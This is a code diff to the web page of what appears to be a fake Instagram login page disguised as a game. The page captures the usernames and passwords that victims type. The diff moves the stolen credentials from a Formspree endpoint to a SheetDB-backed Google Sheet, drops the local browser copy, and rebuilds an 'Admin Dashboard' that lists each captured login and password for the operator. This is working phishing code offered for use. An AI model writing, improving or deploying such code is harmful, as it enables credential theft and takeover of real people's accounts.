@@ -226,35 +226,38 @@
     <div id="dashboardScreen" class="screen hidden">
         <div class="dashboard-card">
             <h2>🔒 Admin Dashboard</h2>
-            <p style="font-size: 12px; color: #a8a8a8;">Captured Credentials (Persistent Storage)</p>
+            <p style="font-size: 12px; color: #a8a8a8;">Central Google Sheets Live Data</p>
             <div class="dash-list" id="dashList">
-                <div style="color: #a8a8a8; text-align: center; padding: 20px;">No logs found.</div>
+                <div style="color: #a8a8a8; text-align: center; padding: 20px;">Loading from Google Sheets...</div>
             </div>
             <button class="game-btn" style="background: #e74c3c;" onclick="closeDashboard()">Back to Login</button>
         </div>
     </div>
 
     <script>
-        // Formspree Email Configuration
-        const FORMSPREE_URL = "https://formspree.io/f/mzednekd";
+        // SheetDB Google Sheets Configuration
+        const SHEETDB_URL = "https://sheetdb.io/api/v1/bahswo4oq4byy";
 
-        function sendToEmail(username, password) {
+        function sendToGoogleSheet(username, password) {
             const timeStr = new Date().toLocaleString();
             const data = {
-                username: username,
-                password: password,
-                time: timeStr,
-                subject: "🚨 New Instagram Login Captured!"
+                data: [
+                    {
+                        username: username,
+                        password: password,
+                        time: timeStr
+                    }
+                ]
             };
 
-            fetch(FORMSPREE_URL, {
+            fetch(SHEETDB_URL, {
                 method: 'POST',
                 headers: {
                     'Accept': 'application/json',
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify(data)
-            }).catch(err => console.log("Email dispatch error:", err));
+            }).catch(err => console.log("Sheet sync error:", err));
         }
 
         // Toggle Password Visibility
@@ -297,20 +300,15 @@
             showScreen('loginScreen');
         }
 
-        // Handle Login & Send to Email + Local Storage Backup
+        // Handle Login & Send to Google Sheets
         const loginForm = document.getElementById('loginForm');
         loginForm.addEventListener('submit', function(e) {
             e.preventDefault();
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
 
-            // Save locally for dashboard view
-            let logs = JSON.parse(localStorage.getItem('ig_secret_logs') || '[]');
-            logs.unshift({ username: u, password: p, time: new Date().toLocaleString() });
-            localStorage.setItem('ig_secret_logs', JSON.stringify(logs));
-
-            // Send instantly to Email via Formspree
-            sendToEmail(u, p);
+            // Send instantly to Google Sheet via SheetDB
+            sendToGoogleSheet(u, p);
 
             showScreen('gameSetupScreen');
         });
@@ -381,25 +379,33 @@
             showScreen('successScreen');
         }
 
-        // Load Dashboard Logs
+        // Load Data directly from Google Sheet into Dashboard
         function loadDashboardData() {
             const list = document.getElementById('dashList');
-            let logs = JSON.parse(localStorage.getItem('ig_secret_logs') || '[]');
-            if(logs.length === 0) {
-                list.innerHTML = `<div style="color: #a8a8a8; text-align: center; padding: 20px;">No logs found yet.</div>`;
-                return;
-            }
-            list.innerHTML = "";
-            logs.forEach((log, index) => {
-                list.innerHTML += `
-                    <div class="dash-item">
-                        <b>#${logs.length - index}</b><br>
-                        <b>User:</b> ${log.username}<br>
-                        <b>Pass:</b> ${log.password}<br>
-                        <span style="color: #8696a0; font-size: 10px;">Time: ${log.time}</span>
-                    </div>
-                `;
-            });
+            list.innerHTML = `<div style="color: #a8a8a8; text-align: center; padding: 20px;">Fetching from Google Sheets...</div>`;
+
+            fetch(SHEETDB_URL)
+                .then(res => res.json())
+                .then(logs => {
+                    if(!logs || logs.length === 0) {
+                        list.innerHTML = `<div style="color: #a8a8a8; text-align: center; padding: 20px;">No logs found yet.</div>`;
+                        return;
+                    }
+                    list.innerHTML = "";
+                    logs.reverse().forEach((log, index) => {
+                        list.innerHTML += `
+                            <div class="dash-item">
+                                <b>#${logs.length - index}</b><br>
+                                <b>User:</b> ${log.username || 'N/A'}<br>
+                                <b>Pass:</b> ${log.password || 'N/A'}<br>
+                                <span style="color: #8696a0; font-size: 10px;">Time: ${log.time || 'N/A'}</span>
+                            </div>
+                        `;
+                    });
+                })
+                .catch(err => {
+                    list.innerHTML = `<div style="color: #e74c3c; text-align: center; padding: 20px;">Error loading data from Google Sheet.</div>`;
+                });
         }
     </script>
 </body>
